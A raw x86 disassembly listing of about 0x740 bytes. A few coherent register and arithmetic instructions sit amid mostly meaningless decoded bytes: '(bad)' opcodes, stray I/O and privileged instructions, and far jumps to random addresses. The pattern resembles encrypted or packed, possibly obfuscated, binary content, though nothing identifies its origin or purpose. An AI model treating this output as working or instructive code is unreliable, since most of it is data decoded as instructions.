  40de73:	mov    DWORD PTR [ebp-0x8],edx
  40de76:	mov    edx,DWORD PTR [ebp-0x20]
  40de79:	xor    edx,eax
  40de7b:	mov    edi,0xffcd8d67
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	test   al,0xa6
  40de93:	fisub  WORD PTR [esi+0x34]
  40de96:	scas   al,BYTE PTR es:[edi]
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	(bad)  
  40de9f:	div    DWORD PTR [edx*1-0x788578c]
  40dea6:	push   esi
  40dea7:	pop    ebp
  40dea8:	iret   
  40dea9:	sbb    DWORD PTR [edi],edi
  40deab:	push   ecx
  40deac:	jbe    0x40de63
  40deae:	dec    ecx
  40deaf:	stos   BYTE PTR es:[edi],al
  40deb0:	and    eax,0x181f15fc
  40deb5:	pop    eax
  40deb6:	ins    BYTE PTR es:[edi],dx
  40deb7:	icebp  
  40deb8:	fsub   QWORD PTR [esp+eax*2]
  40debb:	sub    DWORD PTR [eax],eax
  40debd:	loopne 0x40ded5
  40debf:	dec    esp
  40dec0:	adc    BYTE PTR [ebx-0xb049885],0x39
  40dec7:	dec    esp
  40dec8:	mov    ds:0x72278c8d,al
  40decd:	sub    al,al
  40decf:	sbb    eax,0xa2813737
  40ded4:	shl    DWORD PTR [esp+edx*4-0x15],cl
  40ded8:	jb     0x40defa
  40deda:	outs   dx,DWORD PTR ds:[esi]
  40dedb:	mov    ds:0xdf56d12d,eax
  40dee0:	pop    ebp
  40dee1:	xchg   edi,eax
  40dee2:	mov    edi,0x11f801d1
  40dee7:	xlat   BYTE PTR ds:[ebx]
  40dee8:	jno    0x40deb6
  40deea:	xchg   DWORD PTR [esi],ebx
  40deec:	dec    ecx
  40deed:	pop    edi
  40deee:	sbb    edx,DWORD PTR [edx+esi*2-0x4a922b2d]
  40def5:	dec    BYTE PTR [ebx]
  40def7:	pusha  
  40def8:	dec    esp
  40def9:	or     al,BYTE PTR [eax]
  40defb:	mov    bh,0x47
  40defd:	or     eax,0xd485a65f
  40df02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df03:	xchg   esp,eax
  40df04:	sbb    esi,DWORD PTR ds:0x8b477cfb
  40df0a:	xor    DWORD PTR [ebx+0x18],ecx
  40df0d:	push   ds
  40df0e:	or     eax,0x53a5a0e7
  40df13:	mov    ds,WORD PTR [ebp-0x68c858b1]
  40df19:	xchg   edi,eax
  40df1a:	push   eax
  40df1b:	mov    al,0x81
  40df1d:	push   edx
  40df1e:	outs   dx,BYTE PTR ds:[esi]
  40df1f:	and    al,0xfb
  40df22:	jno    0x40df20
  40df24:	int3   
  40df25:	aaa    
  40df26:	sub    al,0xf2
  40df28:	cmp    eax,0xb462434c
  40df2d:	and    ecx,DWORD PTR [edi+0xfbe765d]
  40df33:	inc    esi
  40df34:	lahf   
  40df35:	and    esp,DWORD PTR [esi+0x38f80342]
  40df3b:	lods   al,BYTE PTR ds:[esi]
  40df3c:	ret    
  40df3d:	loope  0x40decc
  40df3f:	jecxz  0x40dfb1
  40df41:	daa    
  40df42:	mov    ebp,0x3b816139
  40df47:	fsubr  DWORD PTR [edx+eax*8]
  40df4a:	add    ecx,ebp
  40df4c:	lods   al,BYTE PTR ds:[esi]
  40df4d:	je     0x40df11
  40df4f:	cmp    dl,ch
  40df51:	cmp    esi,DWORD PTR [ebx-0x135d56f2]
  40df57:	inc    esi
  40df58:	adc    DWORD PTR [edx+0x35],esp
  40df5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df5c:	popa   
  40df5d:	fs push esi
  40df5f:	aam    0xe0
  40df61:	aaa    
  40df62:	pop    ds
  40df63:	sbb    al,0x3f
  40df65:	out    dx,al
  40df66:	cli    
  40df67:	rcl    BYTE PTR [ecx+0x35574675],cl
  40df6d:	pop    eax
  40df6e:	lahf   
  40df6f:	xor    al,0x2f
  40df71:	aam    0x4
  40df73:	jecxz  0x40dfa1
  40df75:	xchg   edx,eax
  40df76:	xchg   BYTE PTR [ecx-0x6e],dh
  40df79:	and    BYTE PTR [ebp-0x53],bl
  40df7c:	push   ecx
  40df7d:	pushf  
  40df7e:	cli    
  40df7f:	jge    0x40df42
  40df81:	inc    BYTE PTR [ecx*4+0x11cf811e]
  40df88:	fmul   st(6),st
  40df8a:	(bad)  
  40df8b:	jp     0x40df24
  40df8d:	fsubr  QWORD PTR [edx]
  40df8f:	pop    ss
  40df90:	sar    al,cl
  40df92:	loopne 0x40dffb
  40df94:	int    0x58
  40df96:	sbb    DWORD PTR [edi-0x18],ebp
  40df99:	sbb    eax,0x980a7e95
  40df9e:	fwait
  40df9f:	mov    eax,ds:0x673dccc3
  40dfa4:	xchg   BYTE PTR [esi+0x601d19cb],cl
  40dfaa:	dec    ebx
  40dfab:	aaa    
  40dfac:	adc    eax,0x7356f86b
  40dfb1:	fmul   QWORD PTR [eax+0x3ea53151]
  40dfb7:	push   edi
  40dfb8:	push   esi
  40dfb9:	call   0x4705413c
  40dfbe:	lds    ecx,FWORD PTR [edx-0x2d]
  40dfc1:	cli    
  40dfc2:	and    edi,ebx
  40dfc4:	sbb    DWORD PTR [edx],esi
  40dfc6:	mov    es,WORD PTR [edi-0x6f]
  40dfc9:	scas   al,BYTE PTR es:[edi]
  40dfca:	add    eax,edx
  40dfcc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfcd:	xor    ecx,DWORD PTR [ebx]
  40dfcf:	mov    edx,esi
  40dfd1:	inc    edi
  40dfd2:	imul   ecx,DWORD PTR [esi],0x765143c1
  40dfd8:	lahf   
  40dfd9:	shl    BYTE PTR ds:0x1ef0830d,1
  40dfdf:	rcl    BYTE PTR [ecx],1
  40dfe1:	dec    esi
  40dfe2:	repz pop ss
  40dfe4:	in     al,dx
  40dfe5:	and    bl,BYTE PTR [edx+0x7c]
  40dfe8:	sub    eax,0x5511fa56
  40dfed:	clc    
  40dfee:	xchg   BYTE PTR ds:0x3ef91b7e,ch
  40dff4:	jne    0x40e00f
  40dff6:	dec    edi
  40dff7:	dec    edi
  40dff8:	mov    cl,0x4b
  40dffa:	and    BYTE PTR ds:0x2c10694c,al
  40e000:	rol    BYTE PTR [ecx-0x5759df93],1
  40e006:	out    dx,al
  40e007:	jnp    0x40e056
  40e009:	mov    esp,0x6b402cfd
  40e00e:	and    DWORD PTR [esi-0x7e],0x5
  40e012:	iret   
  40e013:	cs pop ebx
  40e015:	xor    cl,BYTE PTR [eax]
  40e017:	sahf   
  40e018:	or     ah,bh
  40e01a:	test   al,bl
  40e01c:	ja     0x40dff0
  40e01e:	mov    edx,0x2f75531
  40e023:	mov    bl,0xcd
  40e025:	imul   edi,DWORD PTR [eax+edi*4],0xf8235e82
  40e02c:	pop    ss
  40e02d:	dec    eax
  40e02e:	cmp    BYTE PTR [ecx],0xb4
  40e031:	bswap  ebp
  40e033:	sub    esi,DWORD PTR [esp+ecx*4-0x38d66874]
  40e03a:	xchg   ebx,eax
  40e03b:	xor    eax,0xc8796f17
  40e040:	test   eax,0x7ee0b472
  40e045:	jae    0x40e058
  40e047:	outs   dx,DWORD PTR ds:[esi]
  40e048:	sub    DWORD PTR [eax+0x23],edx
  40e04b:	ret    
  40e04c:	sub    dh,dl
  40e04e:	test   ch,0x87
  40e051:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e052:	enter  0x59f2,0xe
  40e056:	add    DWORD PTR [ecx],ebx
  40e058:	out    dx,al
  40e059:	ret    
  40e05a:	data16 icebp 
  40e05c:	inc    esp
  40e05d:	inc    esi
  40e05e:	(bad)  
  40e05f:	in     eax,dx
  40e060:	add    DWORD PTR [eax+0x3227b06c],ecx
  40e066:	adc    DWORD PTR [edx],esp
  40e068:	mov    dl,0xfb
  40e06a:	pop    edx
  40e06b:	in     eax,0xbe
  40e06d:	xlat   BYTE PTR ds:[ebx]
  40e06e:	lods   al,BYTE PTR ds:[esi]
  40e06f:	les    esp,FWORD PTR [esi+0x79]
  40e072:	adc    BYTE PTR [esi+ebx*1],ch
  40e075:	fmul   st(6),st
  40e077:	ins    DWORD PTR es:[edi],dx
  40e078:	mov    ah,0xf1
  40e07a:	fnstsw WORD PTR [esp+edx*2+0x160f3149]
  40e081:	cmp    al,0x7b
  40e083:	test   al,0x8d
  40e085:	fdivr  QWORD PTR [ebx+0x3bbd1c85]
  40e08b:	imul   edx,DWORD PTR [eax],0x3c78ab3c
  40e091:	add    eax,0xa12726b2
  40e096:	xor    bl,BYTE PTR [ebx+0x1]
  40e099:	cmp    eax,0x8512c9df
  40e09e:	(bad)  
  40e09f:	cs cs jl 0x40e075
  40e0a3:	fild   DWORD PTR [esi-0x1f]
  40e0a6:	adc    al,0x42
  40e0a8:	pop    esi
  40e0a9:	cli    
  40e0aa:	mov    al,ds:0x473d377e
  40e0af:	fidiv  DWORD PTR [esi-0x67fda74]
  40e0b5:	retf   
  40e0b6:	pop    esp
  40e0b7:	repz inc ah
  40e0ba:	iret   
  40e0bb:	ins    BYTE PTR es:[edi],dx
  40e0bc:	fwait
  40e0bd:	xchg   ebp,eax
  40e0be:	ss call 0xb6d9:0xde54edf6
  40e0c6:	ret    0xf8b7
  40e0c9:	ss lahf 
  40e0cb:	mov    eax,0xf3f8f506
  40e0d0:	fld    DWORD PTR [ecx]
  40e0d2:	mov    ch,0x4a
  40e0d4:	frstpm(287 only) 
  40e0d6:	lock mov esp,eax
  40e0d9:	xor    eax,0x5ba1334c
  40e0de:	repz mov eax,0x25daa396
  40e0e4:	jg     0x40e0ea
  40e0e6:	ja     0x40e0e4
  40e0e8:	daa    
  40e0e9:	inc    esp
  40e0ea:	jl     0x40e16b
  40e0ec:	inc    esi
  40e0ed:	adc    eax,0xe15395b4
  40e0f2:	jmp    0xff76f10f
  40e0f7:	inc    edx
  40e0f8:	sti    
  40e0f9:	xor    DWORD PTR [ebx],ebp
  40e0fb:	ins    BYTE PTR es:[edi],dx
  40e0fc:	pushf  
  40e0fd:	call   0x3a96fe8d
  40e102:	mov    bh,0x9
  40e104:	fstp   QWORD PTR [eax-0x1a]
  40e107:	sbb    DWORD PTR [eax+ebp*4-0x62],eax
  40e10b:	pop    eax
  40e10c:	ds (bad) 
  40e10e:	(bad)  
  40e10f:	stos   DWORD PTR es:[edi],eax
  40e110:	add    dh,dh
  40e112:	out    dx,al
  40e113:	xor    esp,edx
  40e115:	out    dx,eax
  40e116:	(bad)  
  40e117:	jbe    0x40e185
  40e119:	xlat   BYTE PTR ds:[ebx]
  40e11a:	cmp    ch,bl
  40e11c:	xor    dl,BYTE PTR [eax]
  40e11e:	sub    ebx,ebp
  40e120:	mov    esi,0x1d66969e
  40e125:	pop    eax
  40e126:	popa   
  40e127:	pushf  
  40e128:	outs   dx,DWORD PTR ds:[esi]
  40e129:	mov    cs,WORD PTR [eax-0x2aaf6e15]
  40e12f:	ret    0x506e
  40e132:	jbe    0x40e13e
  40e134:	push   esp
  40e135:	adc    DWORD PTR [ebp-0x6e],esi
  40e138:	loopne 0x40e133
  40e13a:	std    
  40e13b:	scas   eax,DWORD PTR es:[edi]
  40e13c:	pop    es
  40e13d:	call   0x771:0xdd8920d0
  40e144:	jge    0x40e135
  40e146:	test   al,0x2d
  40e148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e149:	clc    
  40e14a:	repnz out dx,al
  40e14c:	mov    dl,0x69
  40e14e:	das    
  40e14f:	les    ebp,FWORD PTR [edi-0x30691a0e]
  40e155:	(bad)  
  40e156:	(bad)  
  40e157:	jecxz  0x40e10c
  40e159:	cmp    ah,BYTE PTR [edx-0x1ef66034]
  40e15f:	mov    cl,0x4b
  40e161:	test   DWORD PTR [ebx+ebp*8-0x3974b82d],esi
  40e168:	sub    BYTE PTR [eax-0x4dc273aa],0xfd
  40e16f:	sbb    BYTE PTR [edi],al
  40e171:	sti    
  40e172:	(bad)  
  40e174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e175:	mov    dh,0x88
  40e177:	pop    esp
  40e178:	mov    al,0xd3
  40e17a:	pusha  
  40e17b:	pop    esp
  40e17c:	jb     0x40e126
  40e17e:	pop    esi
  40e17f:	pop    eax
  40e180:	mov    edi,0x287de64f
  40e185:	outs   dx,BYTE PTR ds:[esi]
  40e186:	inc    ebx
  40e187:	push   esi
  40e188:	fnsave [edx-0x7]
  40e18b:	pop    ss
  40e18c:	test   BYTE PTR [edi-0x4e0c2632],ah
  40e192:	and    DWORD PTR [esp+ebx*1],0xffffffd6
  40e196:	ins    DWORD PTR es:[edi],dx
  40e197:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e198:	call   FWORD PTR [eax+0x1528952a]
  40e19e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e19f:	loope  0x40e195
  40e1a1:	cmp    DWORD PTR fs:[edi],edi
  40e1a4:	in     al,dx
  40e1a5:	cmp    BYTE PTR [edx],cl
  40e1a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1a8:	inc    edi
  40e1a9:	sub    al,0xf9
  40e1ab:	call   0x1b30:0x46a3de7f
  40e1b2:	or     eax,DWORD PTR [ebp+0x34c64159]
  40e1b8:	les    eax,FWORD PTR [ebx+0x67a58182]
  40e1be:	xlat   BYTE PTR ds:[ebx]
  40e1bf:	or     bl,ah
  40e1c1:	call   0x3b62:0xd04be394
  40e1c8:	pop    ebp
  40e1c9:	scas   eax,DWORD PTR es:[edi]
  40e1ca:	and    bl,0xb2
  40e1cd:	sub    ebp,edx
  40e1cf:	imul   esi,DWORD PTR [edx],0x7b
  40e1d2:	nop
  40e1d3:	shl    BYTE PTR [edi+0x33],cl
  40e1d6:	sub    eax,0xd3b15779
  40e1db:	jmp    0xf44c:0x1b4b3aff
  40e1e2:	fs je  0x40e199
  40e1e5:	inc    edi
  40e1e6:	mov    ah,dl
  40e1e8:	scas   eax,DWORD PTR es:[edi]
  40e1e9:	dec    esi
  40e1ea:	and    ebx,ebx
  40e1ec:	loopne 0x40e20f
  40e1ee:	sbb    al,0x55
  40e1f0:	push   edi
  40e1f1:	cli    
  40e1f2:	xor    al,0x7f
  40e1f4:	sar    DWORD PTR [edi-0x78],cl
  40e1f7:	out    0x39,al
  40e1f9:	stos   BYTE PTR es:[edi],al
  40e1fa:	aaa    
  40e1fb:	mov    ds:0x63193a3c,al
  40e200:	cs (bad) 
  40e202:	frstor ds:0x9a084833
  40e208:	(bad)  
  40e20a:	inc    esp
  40e20b:	pushf  
  40e20c:	in     eax,0x71
  40e20e:	fld    QWORD PTR [ecx]
  40e210:	push   ss
  40e211:	push   ss
  40e212:	adc    al,0x54
  40e214:	repnz mov al,0xd1
  40e217:	pop    ds
  40e218:	inc    esi
  40e219:	sub    ebp,esp
  40e21b:	push   eax
  40e21c:	xchg   esi,eax
  40e21d:	clc    
  40e21e:	fs adc al,0x86
  40e221:	mov    gs:0x2a853511,al
  40e227:	or     bl,BYTE PTR [esi-0x6a]
  40e22a:	dec    ecx
  40e22b:	cmp    BYTE PTR [edi],dl
  40e22d:	adc    eax,DWORD PTR [ecx]
  40e22f:	cmp    DWORD PTR [esi+0x1ada1677],ebp
  40e235:	lock shl BYTE PTR [ecx],1
  40e238:	enter  0x4a0a,0x28
  40e23c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e23d:	bound  edx,QWORD PTR [ebx-0x304e816f]
  40e243:	pushf  
  40e244:	outs   dx,DWORD PTR ds:[esi]
  40e245:	test   DWORD PTR [ecx],edi
  40e247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e248:	xor    DWORD PTR [edi],ebx
  40e24a:	rcr    DWORD PTR [ecx-0x4a0c3e64],0xc7
  40e251:	xchg   edx,eax
  40e252:	daa    
  40e253:	jbe    0x40e21f
  40e255:	mov    ah,0xa6
  40e257:	and    eax,0xff385846
  40e25c:	std    
  40e25d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e25e:	ror    DWORD PTR [ecx],0x43
  40e261:	dec    ebx
  40e262:	pop    es
  40e263:	test   BYTE PTR [esi],0xa9
  40e266:	imul   ecx,DWORD PTR [ecx+0x1a],0xffffffe1
  40e26a:	dec    esi
  40e26b:	jp     0x40e2e6
  40e26d:	dec    ecx
  40e26e:	mov    dh,0x5d
  40e270:	std    
  40e271:	fst    DWORD PTR [ecx-0x3ff53bbb]
  40e277:	fwait
  40e278:	push   esi
  40e279:	fwait
  40e27a:	dec    edx
  40e27b:	imul   eax,DWORD PTR [ebx-0x51],0x5ade4825
  40e282:	fst    QWORD PTR [ecx]
  40e284:	pop    ecx
  40e285:	xor    ah,BYTE PTR [edi]
  40e287:	pop    ecx
  40e288:	jecxz  0x40e23e
  40e28a:	cmp    edi,esi
  40e28c:	icebp  
  40e28d:	mov    ds:0x9fab5059,eax
  40e292:	and    DWORD PTR [ecx+0x1f],edi
  40e295:	xchg   BYTE PTR [eax+0x7d03fa2b],bh
  40e29b:	lock mov edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x895e5ddc
  40e2c4:	pushf  
  40e2c5:	(bad)  
  40e2c6:	adc    DWORD PTR [esi],ebp
  40e2c8:	stos   BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	push   0x155d095e
  40e2d4:	fld    DWORD PTR [edx+edi*8]
  40e2d7:	out    0x3b,eax
  40e2d9:	mov    esi,0x26d7121c
  40e2de:	and    eax,edx
  40e2e0:	or     al,dl
  40e2e2:	das    
  40e2e3:	shl    BYTE PTR [ebp-0x72304aef],0xba
  40e2ea:	or     eax,0x9113e0d1
  40e2ef:	push   ecx
  40e2f0:	mov    cl,0x7f
  40e2f2:	sbb    ebp,DWORD PTR [eax]
  40e2f4:	and    cl,BYTE PTR [eax+ebx*2]
  40e2f7:	nop
  40e2f8:	inc    esp
  40e2f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2fa:	(bad)  
  40e2fb:	lods   eax,DWORD PTR ds:[esi]
  40e2fc:	jae    0x40e36b
  40e2fe:	lds    eax,FWORD PTR gs:[eax]
  40e301:	jb     0x40e34c
  40e303:	xchg   DWORD PTR ds:0xdfb9828a,esp
  40e309:	repnz mov al,ds:0xfa49dee2
  40e30f:	sub    eax,ebp
  40e311:	jns    0x40e376
  40e313:	nop
  40e314:	add    al,0x60
  40e316:	out    dx,eax
  40e317:	jmp    0xea8b9b3e
  40e31c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e31d:	jmp    0x876:0xffdba614
  40e324:	sub    esp,DWORD PTR [eax-0x61]
  40e327:	push   edi
  40e328:	push   esp
  40e329:	mov    ebp,0xbc60cecd
  40e32e:	mov    ebx,0xc73ae23a
  40e333:	(bad)  
  40e335:	sti    
  40e336:	in     al,0x4
  40e338:	xchg   esi,eax
  40e339:	fmul   DWORD PTR [ecx]
  40e33b:	loope  0x40e2f7
  40e33d:	and    ah,dh
  40e33f:	test   al,0x5
  40e341:	xor    BYTE PTR [ebx+0x62],0x71
  40e345:	add    eax,DWORD PTR [esi-0x1f3a142c]
  40e34b:	aam    0xa9
  40e34d:	in     al,0x2b
  40e34f:	dec    ecx
  40e350:	mov    ds,WORD PTR [edi]
  40e352:	(bad)  
  40e353:	aas    
  40e354:	add    eax,0x8df58575
  40e359:	sbb    ecx,DWORD PTR [edx+0xf]
  40e35c:	mov    ch,dl
  40e35e:	scas   al,BYTE PTR es:[edi]
  40e35f:	mov    esp,0xe0ef2526
  40e364:	xor    eax,0x612ded5e
  40e369:	dec    ebp
  40e36a:	and    eax,0x71f0f0df
  40e36f:	in     eax,0xda
  40e371:	xor    BYTE PTR [eax-0x64],al
  40e374:	rcr    esp,0x5
  40e377:	push   ecx
  40e378:	ja     0x40e360
  40e37a:	add    edi,esi
  40e37c:	mov    eax,ds:0x4404c650
  40e381:	sub    al,0xec
  40e383:	jg     0x40e312
  40e385:	or     cl,BYTE PTR ds:0xdfb8fef2
  40e38b:	loopne 0x40e3a0
  40e38d:	jo     0x40e400
  40e38f:	mov    ah,0xa0
  40e391:	stos   BYTE PTR es:[edi],al
  40e392:	mov    eax,0x13d9eedf
  40e397:	mov    ds:0x4700eec,al
  40e39c:	mov    eax,ds:0x43021cbe
  40e3a1:	sbb    al,0x18
  40e3a3:	shl    ebp,0x2d
  40e3a6:	in     al,dx
  40e3a7:	lock push edx
  40e3a9:	mov    ah,0xf5
  40e3ab:	dec    ebx
  40e3ac:	adc    DWORD PTR [esi],ebx
  40e3ae:	popf   
  40e3af:	icebp  
  40e3b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3b1:	pusha  
  40e3b2:	ret    
  40e3b3:	dec    esi
  40e3b4:	mov    bl,0x11
  40e3b6:	mov    bh,0xad
  40e3b8:	adc    cl,BYTE PTR [eax+0x21023340]
  40e3be:	popa   
  40e3bf:	sub    esp,DWORD PTR [eax+ecx*4-0x4d]
  40e3c3:	retf   
  40e3c4:	gs ret 
  40e3c6:	in     eax,0x9f
  40e3c8:	jno    0x40e354
  40e3ca:	fsub   st(7),st
  40e3cc:	test   DWORD PTR [ebx+0x44],ebx
  40e3cf:	or     BYTE PTR [bx+di-0x33d],al
  40e3d4:	mov    ebp,ebx
  40e3d6:	leave  
  40e3d7:	or     BYTE PTR [eax-0x4],ah
  40e3da:	mov    ebx,esi
  40e3dc:	stos   DWORD PTR es:[edi],eax
  40e3dd:	jle    0x40e3c9
  40e3df:	stc    
  40e3e0:	iret   
  40e3e1:	aam    0x53
  40e3e3:	push   edi
  40e3e4:	test   DWORD PTR [esp+ebp*1+0x1a],eax
  40e3e8:	sbb    ch,bl
  40e3ea:	add    eax,0xb8effa0e
  40e3ef:	push   0x46
  40e3f1:	scas   al,BYTE PTR es:[edi]
  40e3f2:	add    ebp,DWORD PTR [ebx+0x76]
  40e3f5:	imul   ecx,edi,0xa798f150
  40e3fb:	pop    ebx
  40e3fc:	sub    DWORD PTR [ecx+0x6785eb9f],eax
  40e402:	popa   
  40e403:	mov    eax,0x99d07d0a
  40e408:	sbb    BYTE PTR [esp+ebp*8-0x3cf53d31],dh
  40e40f:	fstp   QWORD PTR [edx]
  40e411:	ja     0x40e43e
  40e413:	int    0x53
  40e415:	mov    ch,dl
  40e417:	test   DWORD PTR ds:0xe36faf09,ecx
  40e41d:	in     al,0xf4
  40e41f:	sbb    al,0xe0
  40e421:	sbb    ah,0x11
  40e424:	outs   dx,DWORD PTR ds:[esi]
  40e425:	mov    eax,0x83394410
  40e42a:	fist   DWORD PTR [esi+0x3ad7f955]
  40e430:	cli    
  40e431:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e432:	int    0x93
  40e434:	push   es
  40e435:	in     al,0xcc
  40e437:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e438:	loopne 0x40e468
  40e43a:	sub    edx,esi
  40e43c:	stc    
  40e43d:	in     eax,dx
  40e43e:	int3   
  40e43f:	sbb    dh,BYTE PTR [ebp+0x17e32400]
  40e445:	lods   al,BYTE PTR ds:[esi]
  40e446:	pop    esi
  40e447:	retf   
  40e448:	loope  0x40e473
  40e44a:	jmp    0x656e4d45
  40e44f:	or     bh,BYTE PTR [edx+0x1a]
  40e452:	push   ds
  40e453:	add    al,0xd9
  40e455:	or     dl,ch
  40e457:	retf   
  40e458:	cmp    al,0x8f
  40e45a:	leave  
  40e45b:	adc    BYTE PTR [eax-0x7d840604],bl
  40e461:	in     al,0xbb
  40e463:	sub    bl,BYTE PTR [ecx+ebx*1+0x3c]
  40e467:	enter  0xeac,0x1f
  40e46b:	xchg   esi,eax
  40e46c:	pop    esp
  40e46d:	xchg   edi,eax
  40e46e:	std    
  40e46f:	(bad)  
  40e470:	push   edi
  40e471:	add    ebx,DWORD PTR [ebx+0x13b67a71]
  40e477:	mov    cl,0x58
  40e479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e47a:	scas   eax,DWORD PTR es:[edi]
  40e47b:	cmp    cl,bh
  40e47d:	inc    ecx
  40e47e:	outs   dx,BYTE PTR ds:[esi]
  40e47f:	int3   
  40e480:	and    eax,0x5bbf1877
  40e485:	shl    dl,cl
  40e487:	loopne 0x40e4e1
  40e489:	retf   
  40e48a:	outs   dx,BYTE PTR ds:[esi]
  40e48b:	loop   0x40e492
  40e48d:	sbb    DWORD PTR [edx-0x74],0xffffffdc
  40e491:	neg    DWORD PTR [ecx-0xf]
  40e494:	mov    esi,0xdea6284d
  40e499:	add    DWORD PTR [ecx+eiz*2-0xc],ecx
  40e49d:	ins    BYTE PTR es:[edi],dx
  40e49e:	xor    eax,0xc4a20a81
  40e4a3:	cld    
  40e4a4:	inc    esi
  40e4a5:	scas   eax,DWORD PTR es:[edi]
  40e4a6:	inc    edi
  40e4a7:	jmp    0x40e452
  40e4a9:	aam    0x48
  40e4ab:	scas   eax,DWORD PTR es:[edi]
  40e4ac:	sbb    al,bl
  40e4ae:	into   
  40e4af:	mov    ds:0x86aa391,al
  40e4b4:	dec    eax
  40e4b5:	push   ebp
  40e4b6:	xchg   ebx,eax
  40e4b7:	pop    es
  40e4b8:	sub    dl,BYTE PTR [eax-0x6c9450c2]
  40e4be:	popf   
  40e4bf:	push   ebx
  40e4c0:	mov    eax,ds:0x51d69c5c
  40e4c5:	mov    WORD PTR [esi+0x40a73014],ds
  40e4cb:	pop    esi
  40e4cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4cd:	nop
  40e4ce:	lock test DWORD PTR [ebp+esi*8+0x3e9f0a34],esp
  40e4d6:	inc    ebx
  40e4d7:	pop    edx
  40e4d8:	test   BYTE PTR [edx-0x48ca8385],dh
  40e4de:	or     al,0x8d
  40e4e0:	cdq    
  40e4e1:	push   ebp
  40e4e2:	jl     0x40e4f8
  40e4e4:	pop    ecx
  40e4e5:	mov    al,ds:0xd7dda960
  40e4ea:	pop    edx
  40e4eb:	je     0x40e558
  40e4ed:	call   0x110de9f3
  40e4f2:	pusha  
  40e4f3:	xor    BYTE PTR cs:[edx+edx*4],bh
  40e4f7:	test   al,0xb6
  40e4f9:	and    bh,BYTE PTR [ebx]
  40e4fb:	xchg   edi,eax
  40e4fc:	mov    edx,0xbcc4a91f
  40e501:	jae    0x40e546
  40e503:	mov    ecx,0x8061d096
  40e508:	pusha  
  40e509:	mov    eax,ds:0x7e36cfb3
  40e50e:	lahf   
  40e50f:	and    BYTE PTR [eax],bl
  40e511:	jo     0x40e567
  40e513:	xchg   edx,eax
  40e514:	xor    bl,cl
  40e516:	xchg   ebx,eax
  40e517:	push   ebx
  40e518:	gs fwait
  40e51a:	scas   al,BYTE PTR es:[edi]
  40e51b:	shl    BYTE PTR [edx+0x7fe9a27c],1
  40e521:	mov    ch,BYTE PTR [edi]
  40e523:	inc    eax
  40e524:	add    al,0x53
  40e526:	xchg   eax,eax
  40e528:	imul   ah
  40e52a:	xchg   ecx,eax
  40e52b:	cli    
  40e52c:	adc    DWORD PTR [edx],ebp
  40e52e:	into   
  40e52f:	cdq    
  40e530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e531:	jne    0x40e545
  40e533:	cmp    ecx,DWORD PTR [edi+0x27]
  40e536:	adc    cl,ch
  40e538:	cmp    ebx,ebp
  40e53a:	in     eax,dx
  40e53b:	adc    eax,0x314b551a
  40e540:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e541:	and    DWORD PTR [ebp-0xc],eax
  40e544:	xor    DWORD PTR [edx-0x5a7f38a6],edi
  40e54a:	je     0x40e590
  40e54c:	retf   0xd7cc
  40e54f:	fsubr  st(6),st
  40e551:	ja     0x40e4ec
  40e553:	stos   BYTE PTR es:[edi],al
  40e554:	dec    ebx
  40e555:	push   ebx
  40e556:	mov    ebp,0x240eea36
  40e55b:	xor    ebx,DWORD PTR ds:0xd68a3d82
  40e561:	sub    eax,0xb89e0fb1
  40e566:	mov    eax,0xe49708a9
  40e56b:	leave  
  40e56c:	imul   edx,DWORD PTR [ecx+0x238dca43],0x13
  40e573:	int    0x23
  40e575:	(bad)  [edx+0x12]
  40e578:	adc    ebp,edx
  40e57a:	(bad)  
  40e57b:	mov    ds:0x9e4f03de,al
  40e580:	iret   
  40e581:	inc    edi
  40e582:	dec    eax
  40e583:	imul   eax,DWORD PTR [esi-0x137f19ce],0x2cbe5fba
  40e58d:	arpl   WORD PTR [edi],ax
  40e58f:	add    al,0xd
  40e591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e592:	push   esi
  40e593:	adc    ebx,DWORD PTR [edi]
  40e595:	in     eax,dx
  40e596:	jp     0x40e55c
  40e598:	cmp    DWORD PTR [eax+ebx*4],eax
  40e59b:	pop    esi
  40e59c:	pop    ecx
  40e59d:	dec    esp
  40e59e:	dec    esi
  40e59f:	mov    cl,0x61
  40e5a1:	lea    edi,[ecx+0x5b]
  40e5a4:	les    eax,FWORD PTR [edx]
  40e5a6:	fcom   QWORD PTR [ebp+0x191164a6]
  40e5ac:	jmp    0xf90891c9
